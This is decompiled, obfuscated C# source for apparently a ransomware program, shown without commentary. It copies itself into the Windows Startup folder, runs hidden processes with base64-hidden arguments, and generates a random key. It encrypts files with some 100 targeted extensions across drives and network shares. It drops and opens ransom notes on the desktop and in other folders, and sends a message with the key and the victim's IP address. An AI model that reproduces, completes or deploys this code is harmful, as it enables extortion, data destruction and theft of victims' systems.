	public static string[] KRkKkskNZSstTnnF;

	public static string lAmPIwcPEjNhXG;

	public static bool jwIpebsbuTtJKU;

	public static string baebLNYmOilG;

	public static bool HHLzNKWftxhcT;

	public static bool nCFuCxDDXURK;

	public static bool ztMqipVfVlgMZOq;

	public static bool FozVogARTDEY;

	public static string UvHPjcAlchtwE;

	public static bool geeOWbkDyamU;

	public static bool hUQCboiKyWJxZi;

	public static bool yrqPvlUpuGZW;

	public static bool bLbMRmlIqKb;

	public static bool aDzhxFxDvB;

	public static string AGuLAAdWUTO;

	public static List<string> TdgxQRgoFMw;

	public static List<string> iaHlLkaXwuio;

	public static List<string> nKPyjivwjXGlLxX;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			NFcTJoyMAlaMTsP CS_0024_003C_003E8__locals0 = new NFcTJoyMAlaMTsP();
			CS_0024_003C_003E8__locals0.nwAYAbmTKnUjGt = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.nwAYAbmTKnUjGt) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			DwklPNRRHLFUx.aqbnNCyBYdC(AtNcgpYdstMFwdNy);
		}
		catch (Exception)
		{
		}
		try
		{
			if (VbexJOEZOrg == getString_0(107396964))
			{
				Thread thread = new Thread(xSzZANvnueM.EYuLAXzWHmxjxEG);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (mqeQDptBukI == getString_0(107396964))
		{
			Thread.Sleep(int.Parse(hYdMzWyQBJgl));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FLSEvrhuWfJ == getString_0(107396964))
		{
			try
			{
				qxgooPTkOgwK(tjPFETNBnBMzUXk(getString_0(107396959)));
			}
			catch
			{
			}
		}
		if (dqMjwzdylpdLK == getString_0(107396964))
		{
			CkzzKAVXXVvc.TETlAxFOYAphv();
		}
		try
		{
			if (ihApggwfGvkG == getString_0(107396964) && lAEqkEClCtNx.hdRrbrweXk())
			{
				new GryAFjNRQZh().blkAsULpolVVtl(bool_0: false);
				lAEqkEClCtNx.FIOpscedyrhl();
			}
		}
		catch (Exception)
		{
		}
		if (FJXsFcPZKBWlNn == getString_0(107396964) && lAEqkEClCtNx.hdRrbrweXk())
		{
			new GryAFjNRQZh().blkAsULpolVVtl(bool_0: false);
			new GryAFjNRQZh().jASKRDvhuV();
		}
		if (VpJGOcUaTwfpij == getString_0(107396964))
		{
			rbNwVwDCNKwQE.TaGBumrdvh();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396822);
			string text2 = text + Path.GetFileName(fileName);
			if (iWUecWvWvdy == getString_0(107396964) && fileName != text2)
			{
				Thread thread2 = new Thread(fBoCfpJWrQkB);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (aNVPohsbWbid == getString_0(107396964) && mainModule != null && fileName != text2)
			{
				try
				{
					aSuWOKqpTFWLZt = tAORxSwvAZIvWqkg(0, pjYhYVVkRFVa.Count);
					File.Copy(fileName, text + pjYhYVVkRFVa[aSuWOKqpTFWLZt], overwrite: true);
					Process.Start(text + pjYhYVVkRFVa[aSuWOKqpTFWLZt]);
					GohpVNQjJO();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (aWvdmtYWLU == getString_0(107396964) && DateTime.Now < fpPKoegyFTl)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (DRlOGAWkgnPyhTM == getString_0(107396964) && DateTime.Now > odkofmjGNehiR)
			{
				GohpVNQjJO();
			}
		}
		catch
		{
		}
		DVrtsPxVgHx();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> mUKeFWwqRbsUt = MUKeFWwqRbsUt;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						dgFtyqbndoER(getString_0(107389704), string_0);
					};
				}
				Parallel.ForEach(mUKeFWwqRbsUt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> uitWgaprnpOe = UitWgaprnpOe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						dgFtyqbndoER(getString_0(107392784), string_0);
					};
				}
				Parallel.ForEach(uitWgaprnpOe, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> qxnFKMJGHHM = QxnFKMJGHHM;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389695)), string_0);
					};
				}
				Parallel.ForEach(qxnFKMJGHHM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (OVsecWAEVkGcGjJDv == getString_0(107396964))
				{
					string[] kRkKkskNZSstTnnF = KRkKkskNZSstTnnF;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389695)), getString_0(107389670) + string_0 + getString_0(107389661));
						};
					}
					Parallel.ForEach(kRkKkskNZSstTnnF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				if (!pgBFtwVZlq().Contains(getString_0(107390396)))
				{
					jtJLvUlPurQHRX(yaObxwDYeQoq);
				}
				else
				{
					List<string> source = tYFycaveyEZlTZa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							dgFtyqbndoER(tjPFETNBnBMzUXk(UdOhEiscoVO(getString_0(107389624))), string_0);
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				List<string> dZKPMstogvMqutY = DZKPMstogvMqutY;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389631)), string_0);
					};
				}
				Parallel.ForEach(dZKPMstogvMqutY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source2 = jGCPbbWylwhkiZ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						dgFtyqbndoER(getString_0(107389582), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ztMqipVfVlgMZOq)
			{
				try
				{
					Thread thread4 = new Thread(kSGHIIvRxzbCM.fyAgivVrzhBD);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			dgFtyqbndoER(getString_0(107396817), tjPFETNBnBMzUXk(getString_0(107396836)));
			dgFtyqbndoER(getString_0(107396817), tjPFETNBnBMzUXk(getString_0(107396763)));
			dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107397218)), tjPFETNBnBMzUXk(getString_0(107397173)));
			dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107397218)), tjPFETNBnBMzUXk(getString_0(107397043)));
		}
		if (MblmlkeceAY == getString_0(107396964) && MeOAcFDVIYWMs() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(yQTswOXiTELR.DZCOnmaxvdxRUwq);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = eKcpSjrBmJYP == getString_0(107396964);
		SecureString secureString = new SecureString();
		if (EgQwzOCvnHMPfG == getString_0(107396421))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			OFTUyyIDOSKVU = getString_0(107396416);
		}
		WFhUCfopZvgdKa = iPvNPprVZgkkcgBs.qDBKGOSTlO(IqGAacPaLSyD(secureString));
		if (yrqPvlUpuGZW)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), AGuLAAdWUTO)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), AGuLAAdWUTO), string.Concat(tjPFETNBnBMzUXk(getString_0(107396339)), new WebClient().DownloadString(tjPFETNBnBMzUXk(getString_0(107396346))), getString_0(107396273), tjPFETNBnBMzUXk(getString_0(107396268)), DateTime.Now, getString_0(107396273), tjPFETNBnBMzUXk(getString_0(107396259)), WFhUCfopZvgdKa));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), AGuLAAdWUTO), getString_0(107396682) + WFhUCfopZvgdKa);
				}
			}
			catch (Exception ex7)
			{
				if (geeOWbkDyamU)
				{
					try
					{
						File.AppendAllText(UvHPjcAlchtwE, getString_0(107396653) + ex7.Message + getString_0(107396273));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		HlWlITsmUUg.QQkpLVQKiGTK(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), CrIMGxZNxmnsF), mXpeRwdvjEq(WFhUCfopZvgdKa), null, null, getString_0(107396636), getString_0(107396587), null);
		if (YIPXGAmIVTAgIi == getString_0(107396964))
		{
			try
			{
				oDoBLPSSPDhpnvv();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nZsnEymlTnO();
		}
		try
		{
			wEvxlQCyZAXWA(new string[1] { getString_0(107396602) }, new string[100]
			{
				getString_0(107396561),
				getString_0(107396556),
				getString_0(107396583),
				getString_0(107396574),
				getString_0(107396569),
				getString_0(107396532),
				getString_0(107396527),
				getString_0(107396522),
				getString_0(107396549),
				getString_0(107396544),
				getString_0(107396539),
				getString_0(107396502),
				getString_0(107396493),
				getString_0(107396520),
				getString_0(107396511),
				getString_0(107396506),
				getString_0(107396469),
				getString_0(107396464),
				getString_0(107396459),
				getString_0(107396486),
				getString_0(107396477),
				getString_0(107395928),
				getString_0(107395923),
				getString_0(107395918),
				getString_0(107395913),
				getString_0(107395940),
				getString_0(107395935),
				getString_0(107395930),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395910),
				getString_0(107395905),
				getString_0(107395900),
				getString_0(107395859),
				getString_0(107395854),
				getString_0(107395849),
				getString_0(107395876),
				getString_0(107396527),
				getString_0(107395871),
				getString_0(107396549),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107395820),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395837),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395790),
				getString_0(107395785),
				getString_0(107395812),
				getString_0(107395807),
				getString_0(107395802),
				getString_0(107395765),
				getString_0(107395760),
				getString_0(107395755),
				getString_0(107395782),
				getString_0(107395773),
				getString_0(107395736),
				getString_0(107395727),
				getString_0(107395746),
				getString_0(107395871),
				getString_0(107395701),
				getString_0(107395692),
				getString_0(107395715),
				getString_0(107395706),
				getString_0(107396177),
				getString_0(107396200),
				getString_0(107396195),
				getString_0(107396186),
				getString_0(107396145),
				getString_0(107396168),
				getString_0(107396163),
				getString_0(107396158),
				getString_0(107396153),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396106),
				getString_0(107396129),
				getString_0(107396124),
				getString_0(107396087),
				getString_0(107396082),
				getString_0(107396077),
				getString_0(107396104),
				getString_0(107396095),
				getString_0(107396054),
				getString_0(107396049),
				getString_0(107395905),
				getString_0(107396044),
				getString_0(107396071),
				getString_0(107396066),
				getString_0(107396061),
				getString_0(107396024),
				getString_0(107396015),
				getString_0(107396010),
				getString_0(107396037),
				getString_0(107396028),
				getString_0(107395991),
				getString_0(107395986)
			}, new string[0], IqGAacPaLSyD(secureString), getString_0(107395981));
		}
		catch (Exception ex9)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107396000) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975));
				streamWriter.WriteLine(tjPFETNBnBMzUXk(getString_0(107395430)));
				streamWriter.WriteLine(getString_0(107396273));
				streamWriter.WriteLine(tjPFETNBnBMzUXk(getString_0(107394580)));
				streamWriter.WriteLine(WFhUCfopZvgdKa);
				if (HpbWCpkqwlpVpmb == getString_0(107396421))
				{
					streamWriter.WriteLine(getString_0(107396273));
					streamWriter.WriteLine(tjPFETNBnBMzUXk(getString_0(107394547)) + Convert.ToString(mfvCVNdCLAD.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975), getString_0(107394502) + WFhUCfopZvgdKa);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in PYEHnBxJBpISsEZ)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395975)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975), item + getString_0(107395975), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395975), getString_0(107394502) + WFhUCfopZvgdKa);
				}
			}
			catch (Exception)
			{
			}
			if (!FozVogARTDEY && num > 10)
			{
				break;
			}
		}
		if (xoOIzmzChOZBJa == getString_0(107396964))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394441)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394441));
					streamWriter2.WriteLine(tjPFETNBnBMzUXk(getString_0(107394440)));
					streamWriter2.WriteLine(getString_0(107396273));
					streamWriter2.WriteLine(tjPFETNBnBMzUXk(getString_0(107393879)));
					streamWriter2.WriteLine(WFhUCfopZvgdKa + tjPFETNBnBMzUXk(getString_0(107393822)));
					if (HpbWCpkqwlpVpmb == getString_0(107396421))
					{
						streamWriter2.WriteLine(getString_0(107396273));
						streamWriter2.WriteLine(tjPFETNBnBMzUXk(getString_0(107393777)) + tjPFETNBnBMzUXk(getString_0(107394547)) + Convert.ToString(mfvCVNdCLAD.Count) + tjPFETNBnBMzUXk(getString_0(107393822)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394441), tjPFETNBnBMzUXk(getString_0(107393777)) + getString_0(107394502) + WFhUCfopZvgdKa + tjPFETNBnBMzUXk(getString_0(107393822)));
				}
			}
			catch
			{
			}
		}
		if (WdQFHfcExMiYlnK == getString_0(107396964))
		{
			try
			{
				if (HpbWCpkqwlpVpmb == getString_0(107396421))
				{
					VcazhUwaHziY.jErmpSoHYIUl(getString_0(107393716), getString_0(107393711), getString_0(107393730), string.Concat(tjPFETNBnBMzUXk(getString_0(107396339)), new WebClient().DownloadString(tjPFETNBnBMzUXk(getString_0(107396346))), getString_0(107393721), tjPFETNBnBMzUXk(getString_0(107396268)), DateTime.Now, getString_0(107396273), tjPFETNBnBMzUXk(getString_0(107393684)), Convert.ToString(mfvCVNdCLAD.Count), getString_0(107396273), tjPFETNBnBMzUXk(getString_0(107396259)), WFhUCfopZvgdKa));
				}
				else
				{
					VcazhUwaHziY.jErmpSoHYIUl(getString_0(107393716), getString_0(107393711), getString_0(107393730), string.Concat(tjPFETNBnBMzUXk(getString_0(107396339)), new WebClient().DownloadString(tjPFETNBnBMzUXk(getString_0(107396346))), getString_0(107393721), tjPFETNBnBMzUXk(getString_0(107396268)), DateTime.Now, getString_0(107396273), tjPFETNBnBMzUXk(getString_0(107393684)), Convert.ToString(mfvCVNdCLAD.Count), getString_0(107396273), tjPFETNBnBMzUXk(getString_0(107396259)), WFhUCfopZvgdKa));
				}
			}
			catch
			{
			}
		}
		if (SotcHURFSsO == getString_0(107396964))
		{
			try
			{
				DBwTSuVBCICL.RtxDxRWXrA(new Uri(getString_0(107393667)));
			}
			catch
			{
			}
		}
		if (xoOIzmzChOZBJa == getString_0(107396421))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975)))
				{
					Process.Start(tjPFETNBnBMzUXk(getString_0(107393666)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394441)))
				{
					Process.Start(tjPFETNBnBMzUXk(getString_0(107394121)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394441));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(xNSqMIOLMLAwy))
		{
			try
			{
				File.Delete(xNSqMIOLMLAwy);
			}
			catch
			{
			}
		}
		if (geeOWbkDyamU)
		{
			try
			{
				File.AppendAllText(UvHPjcAlchtwE, getString_0(107394104));
			}
			catch (Exception)
			{
			}
		}
		if (XTNtJjAvASbm == getString_0(107394091))
		{
			GohpVNQjJO();
		}
	}

	public static void fBoCfpJWrQkB()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(tjPFETNBnBMzUXk(getString_0(107394114)), tjPFETNBnBMzUXk(getString_0(107393960)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int tAORxSwvAZIvWqkg(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> OZkIIWflaVi(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107393911)) && !text.ToLower().Contains(getString_0(107393922)) && !text.ToLower().Contains(getString_0(107393365)) && !text.ToLower().Contains(getString_0(107393384)) && !text.ToLower().Contains(getString_0(107393327)) && !text.ToLower().Contains(getString_0(107393338)) && !text.ToLower().Contains(getString_0(107393293)) && !text.ToLower().Contains(getString_0(107393312)) && !text.ToLower().Contains(getString_0(107393275)) && !text.ToLower().Contains(getString_0(107393234)) && !text.ToLower().Contains(getString_0(107393249)) && !text.ToLower().Contains(getString_0(107393338)) && !text.ToLower().Contains(getString_0(107393204)) && !text.ToLower().Contains(getString_0(107393215)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393190)) && !fileInfo.FullName.Contains(getString_0(107393141)) && !fileInfo.FullName.Contains(getString_0(107393156)) && !fileInfo.FullName.Contains(getString_0(107393619)) && !fileInfo.FullName.Contains(getString_0(107393634)) && !fileInfo.FullName.Contains(getString_0(107393585)) && !fileInfo.FullName.Contains(getString_0(107393600)) && !fileInfo.FullName.Contains(getString_0(107393551)) && !fileInfo.FullName.Contains(getString_0(107393570)) && !fileInfo.FullName.Contains(getString_0(107393517)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393536)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393491)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393506)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393457)) && !fileInfo.FullName.Contains(tjPFETNBnBMzUXk(getString_0(107393472))) && !fileInfo.FullName.Contains(getString_0(107393447)) && !fileInfo.FullName.Contains(getString_0(107393434)) && !fileInfo.FullName.EndsWith(getString_0(107395981)) && !fileInfo.FullName.EndsWith(getString_0(107393409)) && !fileInfo.FullName.EndsWith(getString_0(107393404)) && !fileInfo.FullName.EndsWith(getString_0(107392855)) && !fileInfo.FullName.EndsWith(getString_0(107392850)) && !fileInfo.FullName.Contains(getString_0(107392845)) && !fileInfo.FullName.Contains(CrIMGxZNxmnsF) && !fileInfo.FullName.Contains(UvHPjcAlchtwE) && !fileInfo.FullName.Contains(AGuLAAdWUTO))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(VQcuZcdUECpj) * 1024.0 * 1024.0 && cIxqzYzUXVduz == getString_0(107396964))
						{
							list.Add(fileInfo.FullName);
							JFzmBipfsgNGYECL(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && cIxqzYzUXVduz == getString_0(107396421))
						{
							list.Add(fileInfo.FullName);
							JFzmBipfsgNGYECL(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string dgFtyqbndoER(string CZyzkEVmpqOLQXm = "", string gollAzHANdPZbhW = "")
	{
		string result = getString_0(107393667);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CZyzkEVmpqOLQXm,
				Arguments = gollAzHANdPZbhW,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void qxgooPTkOgwK(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392860),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string UdOhEiscoVO(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string tjPFETNBnBMzUXk(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void oDoBLPSSPDhpnvv()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		yQTswOXiTELR.oQvRPnJsvHPWG();
		nKPyjivwjXGlLxX = yQTswOXiTELR.SAAqanTiYmNU();
		List<RiRQeTkjLxd> list = RiRQeTkjLxd.YjzJulptGLxZ();
		foreach (RiRQeTkjLxd item in list)
		{
			iaHlLkaXwuio.Add(item.IPAddress);
		}
		TdgxQRgoFMw = nKPyjivwjXGlLxX.Union(iaHlLkaXwuio).ToList();
		foreach (string item2 in TdgxQRgoFMw)
		{
			if ((!item2.StartsWith(getString_0(107392811)) && !item2.StartsWith(getString_0(107392838)) && !item2.StartsWith(getString_0(107392829)) && !item2.StartsWith(getString_0(107393667))) || !yQTswOXiTELR.jfZgqqjrvPI(item2))
			{
				continue;
			}
			try
			{
				if (lAoTEijSeOCrur == getString_0(107396964))
				{
					for (int i = 0; i < yQTswOXiTELR.PnvVzbsgauow.Count; i++)
					{
						dgFtyqbndoER(getString_0(107392784), getString_0(107392803) + item2 + getString_0(107392794) + yQTswOXiTELR.PnvVzbsgauow[i] + getString_0(107392749) + yQTswOXiTELR.SpnhDMEosoca[i]);
					}
				}
				else
				{
					dgFtyqbndoER(getString_0(107392784), getString_0(107392803) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			yQTswOXiTELR.xZWcgFFKtqP xZWcgFFKtqP = new yQTswOXiTELR.xZWcgFFKtqP(yQTswOXiTELR.GNGyGoZvnEtSW.xSiyVTGqxFfo, yQTswOXiTELR.otpRlEoFBjrP.BrzibxxUHTqCRH, yQTswOXiTELR.jfBDnrCLwhSyXX.tnnIayOplqT, yQTswOXiTELR.JaiZZywDZVa.ZnvIkzkTBSxPdm);
			foreach (string item3 in xZWcgFFKtqP)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107392776));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (lAoTEijSeOCrur == getString_0(107396964))
						{
							for (int j = 0; j < yQTswOXiTELR.PnvVzbsgauow.Count; j++)
							{
								dgFtyqbndoER(getString_0(107392784), getString_0(107392663) + item4.ToString() + getString_0(107392794) + yQTswOXiTELR.PnvVzbsgauow[j] + getString_0(107392749) + yQTswOXiTELR.SpnhDMEosoca[j]);
							}
						}
						else
						{
							dgFtyqbndoER(getString_0(107392784), getString_0(107392663) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!PelwIoYLMluwkT.Contains(item4.ToString()))
					{
						PelwIoYLMluwkT.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = UdOhEiscoVO(getString_0(107392654));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tjPFETNBnBMzUXk(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(tjPFETNBnBMzUXk(getString_0(107393093)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(tjPFETNBnBMzUXk(getString_0(107393004)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (cCTuunwfNioo == getString_0(107396964))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107392991), getString_0(107392950));
				File.WriteAllText(text, tjPFETNBnBMzUXk(getString_0(107392941)), Encoding.ASCII);
				dgFtyqbndoER(getString_0(107396817), getString_0(107391855) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391850))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391850)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391873))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391873)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391320));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!PelwIoYLMluwkT.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391299), getString_0(107396822)).Replace(getString_0(107391294), getString_0(107391299))
					.Replace(getString_0(107391253), getString_0(107393667))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					PelwIoYLMluwkT.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391299), getString_0(107396822)).Replace(getString_0(107391294), getString_0(107391299))
						.Replace(getString_0(107391253), getString_0(107393667))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391248), getString_0(107393667)) + getString_0(107391271));
				}
			}
		}
		finally
